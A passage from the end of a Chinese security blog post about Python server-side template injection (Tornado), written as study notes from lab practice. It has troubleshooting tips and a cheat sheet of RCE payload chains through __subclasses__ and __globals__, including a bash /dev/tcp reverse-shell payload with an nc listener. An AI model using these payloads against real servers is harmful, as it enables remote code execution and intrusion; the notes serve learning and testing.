+<h3 id="curl-没回显-≠-payload-失败"><a href="#curl-没回显-≠-payload-失败" class="headerlink" title="curl 没回显 ≠ payload 失败"></a>curl 没回显 ≠ payload 失败</h3><p>浏览器里能拿到回显，curl 却返回空或跳<code>/login</code>——大概率是目标有登录认证，curl 没带 cookie。只需要在浏览器复制 Cookie，curl 加 <code>-b</code> 参数带上。</p>
+<h3 id="确认-RCE-但-shell-不回来"><a href="#确认-RCE-但-shell-不回来" class="headerlink" title="确认 RCE 但 shell 不回来"></a>确认 RCE 但 shell 不回来</h3><p>分步排查：先确认目标能出网（<code>curl</code>你的攻击机），再确认端口没被防火墙拦。都不行就换回连方式——bash 反弹、nc 反弹、Python 反弹分别尝试。</p>
+<h2 id="速查"><a href="#速查" class="headerlink" title="速查"></a>速查</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">SSTI 完整攻击路径：</span><br><span class="line">&#123;&#123;7*7&#125;&#125; → 49 确认注入</span><br><span class="line">    ↓</span><br><span class="line">().__class__.__bases__[0]    抵达 object</span><br><span class="line">.__subclasses__()            展开子类列表</span><br><span class="line">    ↓</span><br><span class="line">搜索三类目标：Popen / _wrap_close / catch_warnings → 记索引 N</span><br><span class="line">    ↓</span><br><span class="line">选择链路：</span><br><span class="line">  看回显   → [N].__init__.__globals__[&#x27;popen&#x27;](&#x27;cmd&#x27;).read()</span><br><span class="line">  反弹shell → [N].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;&#x27;&#x27;...&#x27;&#x27;&#x27;)</span><br><span class="line">    ↓</span><br><span class="line">三重引号处理引号嵌套</span><br><span class="line">    ↓</span><br><span class="line">nc -lvnp 监听 → 触发 payload → shell</span><br></pre></td></tr></table></figure>
+
+<p>三条 RCE 链备用：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># A: Popen（直连）</span></span><br><span class="line">[N](<span class="string">&#x27;id&#x27;</span>, shell=<span class="literal">True</span>, stdout=-<span class="number">1</span>).communicate()[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># B: popen（回显方便）</span></span><br><span class="line">[N].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;id&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># C: eval（终极链，反弹 shell）</span></span><br><span class="line">[N].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;&#x27;&#x27;__import__(&#x27;os&#x27;).system(&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1&quot;&#x27;)&#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="../../../../tags/SSTI/" rel="tag">SSTI</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="../../../../tags/WEB/" rel="tag">WEB</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+    
+    
+    <div class="article-nav-link-wrap right">
+      
+        
+        
+          <img data-src="/covers/【哲风壁纸】圣杯战争-日本动漫.png" data-sizes="auto" alt="记一道pwn入门堆题 off-by-one" class="lazyload">
+        
+      
+      <a href="/2026/06/11/%E8%AE%B0%E4%B8%80%E9%81%93pwn%E5%85%A5%E9%97%A8%E5%A0%86%E9%A2%98-off-by-one/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          记一道pwn入门堆题 off-by-one
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+
+
+
+  <section id="comments" data-aos="fade-up">
+    <div class="comment-header">
+      
+      
+        
+      
+      <h2 class="comment-title">说些什么吧！</h2>
+      <div class="comment-selector">
+        <div class="comment-selector-wrap">
+            
+            <div class="selector-item" data-selector="giscus">
+              <span>giscus</span>
+            </div>
+            
+        </div>
+      </div>
+    </div>
+    <div class="comment-content">
+      
+        <div class="comment giscus-comment" data-aos="fade-up"
+          id="giscus-comment">
+        </div>
+      
+    </div>
+  </section>
+
+
+</section>
+        </div>
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      
+      
+      
+        2020-2026
+      
+      <span class="footer-info-sep rotate"></span>
+      淋着雨
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        7.4k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        00:27
+      </div>
+    
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+  
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-SSTI"><span class="toc-number">1.</span> <span class="toc-text">什么是 SSTI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%EF%BC%9APython-%E5%AF%B9%E8%B1%A1%E5%8F%8D%E5%B0%84%E9%93%BE"><span class="toc-number">2.</span> <span class="toc-text">核心原理：Python 对象反射链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload-%E9%80%9A%E7%94%A8%E6%8E%A8%E5%AF%BC%E6%B5%81%E7%A8%8B"><span class="toc-number">3.</span> <span class="toc-text">payload 通用推导流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E7%A1%AE%E8%AE%A4%E5%BC%95%E6%93%8E%E7%B1%BB%E5%9E%8B"><span class="toc-number">3.1.</span> <span class="toc-text">第一步：确认引擎类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E6%9E%84%E9%80%A0%E6%8A%B5%E8%BE%BE-object-%E7%9A%84%E8%B7%AF%E5%BE%84"><span class="toc-number">3.2.</span> <span class="toc-text">第二步：构造抵达 object 的路径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E4%BB%8E%E5%AD%90%E7%B1%BB%E5%88%97%E8%A1%A8%E4%B8%AD%E5%AE%9A%E4%BD%8D%E4%B8%89%E7%B1%BB%E9%BB%84%E9%87%91%E7%9B%AE%E6%A0%87"><span class="toc-number">3.3.</span> <span class="toc-text">第三步：从子类列表中定位三类黄金目标</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A%E6%9E%84%E9%80%A0-RCE-%E8%BD%BD%E8%8D%B7"><span class="toc-number">3.4.</span> <span class="toc-text">第四步：构造 RCE 载荷</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E7%82%B9%EF%BC%9A%E5%BC%95%E5%8F%B7%E5%B5%8C%E5%A5%97%E4%B8%8E%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6"><span class="toc-number">4.</span> <span class="toc-text">注意点：引号嵌套与特殊字符</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E7%A7%8D%E5%BC%95%E5%8F%B7%E7%9A%84%E5%8C%85%E5%AE%B9%E5%85%B3%E7%B3%BB"><span class="toc-number">4.1.</span> <span class="toc-text">三种引号的包容关系</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E3%80%81-%E3%80%81-%E7%A0%B4%E5%9D%8F-Tornado-%E8%A7%A3%E6%9E%90"><span class="toc-number">4.2.</span> <span class="toc-text">&gt;、&amp;、|破坏 Tornado 解析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E7%A7%8D%E7%BB%95%E8%BF%87%E7%AD%96%E7%95%A5"><span class="toc-number">4.3.</span> <span class="toc-text">四种绕过策略</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E8%B8%A9%E5%9D%91"><span class="toc-number">5.</span> <span class="toc-text">常见踩坑</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#builtins-%E6%98%AF-dict-%E8%BF%98%E6%98%AF-module%EF%BC%9F"><span class="toc-number">5.1.</span> <span class="toc-text">__builtins__是 dict 还是 module？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#curl-%E6%B2%A1%E5%9B%9E%E6%98%BE-%E2%89%A0-payload-%E5%A4%B1%E8%B4%A5"><span class="toc-number">5.2.</span> <span class="toc-text">curl 没回显 ≠ payload 失败</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A1%AE%E8%AE%A4-RCE-%E4%BD%86-shell-%E4%B8%8D%E5%9B%9E%E6%9D%A5"><span class="toc-number">5.3.</span> <span class="toc-text">确认 RCE 但 shell 不回来</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9F%E6%9F%A5"><span class="toc-number">6.</span> <span class="toc-text">速查</span></a></li></ol>
+  
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="淋着雨" class="lazyload">
+  <div class="sidebar-author-name">淋着雨</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">7</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">2</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">10</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="主页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">主页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+    
+  </div>
+  
+    
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+    
+  
+</nav>
+
+    </div>
+    
+    
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+
+<script src="../../../../js/script.js"></script>
+
+
+
+  
+<script src="../../../../js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="../../../../js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js" integrity="sha384-8LyaidD9GPxQQgLJO&#x2F;WRw&#x2F;O2h3BoNq&#x2F;ApI&#x2F;ecpvM6RsrCz2qP2ppBXUKihP4V&#x2F;2d" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--purple-1)","var(--purple-2)","var(--purple-3)","var(--purple-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--purple-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "淋着雨",
+          title: "记SSTI模板注入",
+          url: "http://1t01x1w4.github.io/2026/07/19/%E8%AE%B0SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/",
+          excerpt: "",
+          description: "",
+          stripContent: "最近打靶机碰到一个 Tornado 框架的模板注入，之前只接触过一点皮毛，知道用().__class__.__bases__().__subclasses__()列出当前类的根类下的所有子类，但是接下来该怎么构造payload一窍不通了。本文旨在记录SSTI模板注入的原理、如何构造payload以及绕过手法等，方便复习查看。 什么是 SSTISSTI，即服务端模板注入（Server-Side Template Injection），本质是用户输入被模板引擎当作代码执行了。例如当提交&amp;#123;&amp;",
+          date: "Sun Jul 19 2026 14:51:02 GMT+0800",
+          updated: "Sun Jul 19 2026 17:25:27 GMT+0800",
+          cover: "/images/bannner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="../../../../js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+        
+
+
+
+
+
+
+
+
+<script data-pjax>
+  var loadScript = (src, integrity) => {
+    const script = document.createElement('script');
+    script.src = src;
+    if (integrity) script.integrity = integrity;
+    script.crossOrigin = 'anonymous';
+    return script;
+  };
+
+  var commentConfigKeys = ['valine', 'waline', 'twikoo', 'gitalk', 'giscus'];
+  var commentConfig = {
+    valine: {
+      enable: false,
+      load: () => {
+        const container = document.querySelector('.valine-comment');
+        if (!container) return;
+        container.style.display = 'block';
+
+        const script = loadScript(
+          'https://npm.webcache.cn/valine@1.5.1/dist/Valine.min.js',
+          'sha384-3ma91AExDeMAZ1rjTjaP8V2A2obQE+s5ltKRwYlwdpArz9xVbp0tF3b0VV2ACNPn'
+        );
+        script.onload = () => {
+          var GUEST_INFO = ['nick', 'mail', 'link'];
+          var guest_info = 'nick,mail,link'.split(',').filter((item) => {
+            return GUEST_INFO.indexOf(item) > -1
+          });
+          var recordIP = JSON.parse('true');
+          var highlight = JSON.parse('true');
+          var visitor = JSON.parse('false');
+          var serverURLs = undefined;
+
+          if (window.Valine) {
+            new Valine({
+              el: '.valine-comment',
+              appId: "",
+              appKey: "",
+              placeholder: "Just go go",
+              pageSize: '10',
+              avatar: 'mp',
+              lang: document.documentElement.lang || 'en',
+              recordIP: recordIP,
+              highlight: highlight,
+              visitor: visitor,
+              requiredFields: guest_info,
+              path: window.location.pathname,
+              serverURLs
+            });
+          }
+        };
+        document.head.appendChild(script);
+      }
+    },
+    waline: {
+      enable: false,
+      load: async () => {
+        const container = document.querySelector('.waline-comment');
+        if (!container) return;
+        container.style.display = 'block';
+
+        let walineInit;
+        const walineCdn = 'https://npm.webcache.cn/@waline/client@2.15.8/dist/waline.mjs';
+        const walineIntegrity = 'sha384-9sbqJjrfGjbkI6/PI4nU/MvBfEmkkPC4YK9I4zBeMIf1CVCZdCMH/KinBEAZII/5';
+
+        const module = await safeImport(walineCdn, walineIntegrity);
+        walineInit = module.init;
+
+        window.walineInstance = walineInit({
+          el: '.waline-comment',
+          serverURL: '',
+          lang: document.documentElement.lang || 'en',
+          locale: {},
+          emoji: ["https://unpkg.com/@waline/emojis@1.2.0/weibo","https://unpkg.com/@waline/emojis@1.2.0/alus","https://unpkg.com/@waline/emojis@1.2.0/bilibili","https://unpkg.com/@waline/emojis@1.2.0/qq","https://unpkg.com/@waline/emojis@1.2.0/tieba","https://unpkg.com/@waline/emojis@1.2.0/tw-emoji"],
+          meta: ["nick","mail","link"],
+          requiredMeta: ["nick","mail"],
+          wordLimit: JSON.parse('0'),
+          comment: true,
+          pageSize: JSON.parse('10'),
+          dark: 'html[data-theme="dark"]',
+          pageview: JSON.parse('true'),
+        });
+      }
+    },
+    twikoo: {
+      enable: false,
+      load: () => {
+        const container = document.querySelector('.twikoo-comment');
+        if (!container) return;
+        container.style.display = 'block';
+
+        const script = loadScript(
+          'https://npm.webcache.cn/twikoo@1.6.44/dist/twikoo.all.min.js',
+          'sha384-kwWLC0HjeZZnVPqCJ1AncI8tsk+kQqF9TbAmCclcc9Z0hGkfgHRzeQZxmdmZhE0K'
+        );
+
+        script.onload = () => {
+          if (window.twikoo) {
+            twikoo.init({
+              envId: '',
+              el: '.twikoo-comment',
+              region: '',
+              lang: document.documentElement.lang || 'en',
+            });
+
+            twikoo.getCommentsCount({
+              envId: '',
+              region: '',
+              urls: [
+                '/2026/07/19/%E8%AE%B0SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/'
+              ],
+              includeReply: false
+            }).then((res) => {
+              _$('.twikoo-comment-count').innerText = res[0].count;
+            }).catch((err) => {
+              console.error(err);
+            });
+          }
+        } 
+        document.head.appendChild(script);
+      }
+    },
+    gitalk: {
+      enable: false,
+      load: () => {
+        const container = document.querySelector('.gitalk-comment');
+        if (!container) return;
+        container.style.display = 'block';
+
+        const script = loadScript(
+          'https://npm.webcache.cn/gitalk@1.8.0/dist/gitalk.min.js',
+          'sha384-kspnZUWBoSWwoJHa0hBCXYbHGbhvU/lcEH5O8eVbSDhbPwsiVUTp/aGX/z/5EuMA'
+        );
+
+        script.onload = () => {
+          if (false) {
+            const md5Script = loadScript(
+              'https://npm.webcache.cn/blueimp-md5@2.19.0/js/md5.min.js',
+              'sha384-JmVtRz6RWiXnA14QbIOJzPuU3MidULOpBP66deeLLyyoF4Tr/gZlbkHkL6vTthxH'
+            );
+            md5Script.onload = initGitalk;
+            document.head.appendChild(md5Script);
+          } else {
+            initGitalk();
+          }
+        }
+        document.head.appendChild(script);
+
+        function initGitalk() {
+          var gitalkId = location.pathname;
+          var gitalk = new Gitalk({
+            clientID: '',
+            clientSecret: '',
+            repo: '',
+            owner: '',
+            admin: null,
+            id: gitalkId,
+            distractionFreeMode: false,
+            language: document.documentElement.lang || 'en',
+          })
+          gitalk.render('gitalk-comment');
+        }
+      }
+    },
+    giscus: {
+      enable: true,
+      load: () => {
+        const container = document.querySelector('.giscus-comment');
+        if (!container) return;
+        container.style.display = 'block';
+
+        // 删除可能已存在的 giscus 脚本和 iframe
+        const existingScript = container.querySelector('script[src*="giscus.app/client.js"]');
+        if (existingScript) existingScript.remove();
+        const existingFrame = document.querySelector('iframe.giscus-frame');
+        if (existingFrame) existingFrame.remove();
+
+        const giscusScript = document.createElement('script');
+        const domMode = document.documentElement.getAttribute("data-theme");
+
+        const docLang = document.documentElement.lang || 'en';
+        const langBase = docLang.split('-')[0];
+        const supportedLangs = ['ar', 'be', 'bg', 'ca', 'cs', 'da', 'de', 'en', 
+        'eo', 'es', 'eu', 'fa', 'fr', 'gr', 'hbs', 'he', 'hu', 'id', 'it', 'ja', 
+        'kh', 'ko', 'nl', 'pl', 'pt', 'ro', 'ru', 'th', 'tr', 'uk', 'uz', 'vi', 'zh-CN', 'zh-HK', 'zh-TW'];
+        const giscusLang = supportedLangs.includes(docLang) ? docLang : supportedLangs.includes(langBase) ? langBase : 'en';
+
+        giscusScript.src = 'https://giscus.app/client.js';
+        giscusScript.setAttribute('data-repo', '1t01x1w4/1t01x1w4.github.io');
+        giscusScript.setAttribute('data-repo-id', 'R_kgDORN3jAg');
+        giscusScript.setAttribute('data-category', 'General'); 
+        giscusScript.setAttribute('data-category-id', 'DIC_kwDORN3jAs4C2arB');
+        giscusScript.setAttribute('data-mapping', '0');
+        giscusScript.setAttribute('data-strict', '0');
+        giscusScript.setAttribute('data-reactions-enabled', '1');
+        giscusScript.setAttribute('data-emit-metadata', '0');
+        giscusScript.setAttribute('data-input-position', 'bottom');
+        giscusScript.setAttribute('data-theme', domMode === 'dark' ? 'dark' : 'light');
+        giscusScript.setAttribute('data-lang', giscusLang);
+        giscusScript.setAttribute('crossorigin', 'anonymous');
+        giscusScript.async = true;
+        container.appendChild(giscusScript);
+        document.body.addEventListener('light-theme-set', () => {
+          const iframe = document.querySelector('iframe.giscus-frame');
+          if (!iframe) return;
+          iframe.contentWindow.postMessage({ giscus: { setConfig: { theme: 'light' } } }, 'https://giscus.app');
+        });
+        document.body.addEventListener('dark-theme-set', () => {
+          const iframe = document.querySelector('iframe.giscus-frame');
+          if (!iframe) return;
+          iframe.contentWindow.postMessage({ giscus: { setConfig: { theme: 'dark' } } }, 'https://giscus.app');
+        });
+      }
+    }
+  }
+  commentConfig.enable = commentConfigKeys.some(key => commentConfig[key].enable);
+
+  var defaultComment = '';
+  if (commentConfig.enable) {
+    // 1. 首先检查localStorage中是否有保存的评论类型
+    var savedCommentType = localStorage.getItem('commentType');
+    
+    // 2. 如果localStorage中有值且对应的评论系统可用，就使用它
+    if (savedCommentType) {
+      if (commentConfig[savedCommentType]?.enable) {
+        defaultComment = savedCommentType;
+      }
+    }
+    
+    // 3. 如果localStorage无效，检查配置的默认评论系统
+    if (!defaultComment) {
+      var configDefault = 'waline';
+      if (commentConfig[configDefault]?.enable) {
+        defaultComment = configDefault;
+      }
+    }
+    
+    // 4. 如果前两项都无效，按指定顺序找到第一个可用的评论系统
+    if (!defaultComment) {
+      defaultComment = commentConfigKeys.find(sys => commentConfig[sys].enable) || '';
+    }
+  }
+  function loadComments() {
+    if (!commentConfig.enable) return;
+    // 评论组件加载状态跟踪
+    const loadedComments = {
+      valine: false,
+      waline: false,
+      twikoo: false,
+      gitalk: false,
+      giscus: false
+    };
+
+    // 隐藏所有评论容器
+    const hideAllComments = () => {
+      const commentContainers = document.querySelectorAll('.comment');
+      commentContainers.forEach(container => {
+        container.style.display = 'none';
+      });
+    };
+
+    // 按需加载评论系统
+    const loadCommentSystem = (type) => {
+      if (loadedComments[type]) {
+        // 如果已加载，只需显示对应容器
+        document.querySelector(`.${type}-comment`).style.display = 'block';
+        return;
+      }
+
+      // 根据类型加载对应的脚本
+      commentConfig[type]?.load();
+      loadedComments[type] = true;
+    };
+
+    // 评论组件选择器
+    const changeActiveCommentItems = (item) => {
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let i = 0; i < commentItems.length; i++) {
+        commentItems[i].classList.remove('active');
+      }
+      item.classList.add('active');
+
+      // 获取要加载的评论系统类型
+      const commentType = item.getAttribute('data-selector');
+
+      // 隐藏所有评论系统
+      hideAllComments();
+
+      // 加载选中的评论系统
+      loadCommentSystem(commentType);
+    };
+
+    const commentInit = () => {
+      // 评论组件选择器点击事件
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let item of commentItems) {
+        item.addEventListener('click', () => {
+          // 保存选择器状态
+          const commentType = item.getAttribute('data-selector');
+          window.localStorage.setItem('commentType', commentType);
+          // 切换选中状态
+          changeActiveCommentItems(item);
+        });
+      }
+
+      // 检查是否需要加载默认评论系统
+      if (defaultComment) {
+        const defaultSelectorItem = document.querySelector(`[data-selector="${defaultComment}"]`);
+        if (!defaultSelectorItem) return;
+        defaultSelectorItem.style.display = 'block';
+        defaultSelectorItem.classList.add('active');
+        loadCommentSystem(defaultComment);
+      }
+    }
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', commentInit);
+    } else {
+      commentInit();
+    }
+  };
+  loadComments();
+</script>
+
+      
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.9.2' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+
+
+
+
+
+    
+  </body>
+  </html>
+
